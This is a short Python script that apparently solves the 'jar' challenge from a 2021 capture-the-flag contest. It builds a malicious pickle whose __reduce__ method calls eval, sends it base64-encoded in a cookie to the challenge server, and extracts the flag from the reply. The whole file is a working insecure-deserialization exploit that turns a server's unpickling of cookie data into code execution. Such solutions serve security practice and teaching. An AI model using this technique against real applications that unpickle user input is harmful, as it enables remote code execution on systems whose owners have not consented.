import base64
import pickle

import requests


# __reduce__ defines how an object is unpickled
class A:
    def __reduce__(self):
        return eval, ("flag",)


if __name__ == "__main__":
    URL = "https://jar.2021.chall.actf.co/"

    pickled = pickle.dumps(A())
    contents = base64.urlsafe_b64encode(pickled).decode()

    res = requests.get(URL, cookies={"contents": contents})
    lines = res.text.split("</div>")
    flag = "".join(line[-1] for line in lines if line)
    print(flag)
